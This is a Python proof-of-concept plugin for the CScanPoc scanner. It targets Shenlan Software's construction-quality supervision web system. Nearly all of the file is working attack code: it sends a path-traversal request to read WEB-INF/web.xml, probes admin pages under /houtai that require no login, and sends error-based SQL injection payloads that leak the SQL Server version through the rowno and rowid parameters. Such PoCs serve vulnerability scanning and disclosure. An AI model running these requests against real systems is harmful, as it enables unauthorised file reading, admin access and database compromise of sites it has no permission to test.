# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Shenlan_0001_p'  # 平台漏洞编号，留空
    name = '深蓝软件建筑工程质量安全监督系统任意文件下载/任意上传/任意删除/越权操作/SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-27'  # 漏洞公布时间
    desc = '''
        深蓝软件建筑工程质量安全监督系统任意文件下载/任意上传/任意删除/越权操作/SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=070106
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '绍兴深蓝软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dde4464b-ecb7-448a-a17c-b4190422ca17'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/download.jsp?path=../WEB-INF/web.xml'
            code, head, res, err, _ = hh.http(url)
            if (code == 200) and ('<?xml' in res) and ('<web-app>' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            # 后台未授权访问
            url = arg + '/houtai/main.jsp'
            code, head, res, err, _ = hh.http(url)
            #print res
            if(code == 200) and ('网站管理平台'.decode('utf-8').encode('gb2312') in res) and ('src="left.jsp"' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            # 未授权访问
            urls = [
                arg + '/houtai/zxzx.jsp?type=1',
                arg + '/houtai/bszn.jsp?type=1'
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if(code == 200) and ('发布日期'.decode('utf-8').encode('gb2312') in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            url = arg + '/houtai/yqlj.jsp'
            code, head, res, err, _ = hh.http(url)
            if(code == 200) and ('链接说明'.decode('utf-8').encode('gb2312') in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            # SQL注入
            urls = [
                arg +
                '/houtai/masterfujian.jsp?rowno=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg +
                '/houtai/modi.jsp?type=1&rowid=100%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if (code == 500) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
